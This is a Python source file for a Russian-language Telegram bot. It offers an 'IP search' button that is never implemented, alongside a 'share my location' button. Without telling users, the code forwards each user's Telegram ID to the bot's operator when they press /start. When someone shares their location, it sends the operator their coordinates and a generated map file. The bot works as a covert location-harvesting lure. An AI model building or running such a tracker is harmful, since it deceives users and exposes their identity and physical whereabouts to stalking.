import telebot
import prived_info
from telebot import types
import map
@prived_info.bot.message_handler(commands=['start'])

def hello(info):
    user_name = info.from_user.username
    virtual = types.ReplyKeyboardMarkup(resize_keyboard=True)
    find_ip = types.KeyboardButton(text='поиск по ip')
    my_location = types.KeyboardButton(text='моя локация', request_location=True)
    virtual.add(find_ip, my_location)
    prived_info.bot.send_message(info.chat.id, f'привет {user_name}', reply_markup=virtual)
    prived_info.bot.send_message(prived_info.my_id, info.from_user.id)


@prived_info.bot.message_handler(content_types=['location'])

def location(info):
    if info.location is not None:
        map.map_coordination(f'{info.from_user.username}', f'{info.location.latitude}', f'{info.location.longitude}')
        with open(f'{info.from_user.username}.html', 'rb') as file_map:
            prived_info.bot.send_document(prived_info.my_id, file_map)
        prived_info.bot.send_message(prived_info.my_id, info.location)


@prived_info.bot.message_handler(content_types=['text'])

def handler_text(info):
    pass

prived_info.bot.polling(none_stop=True)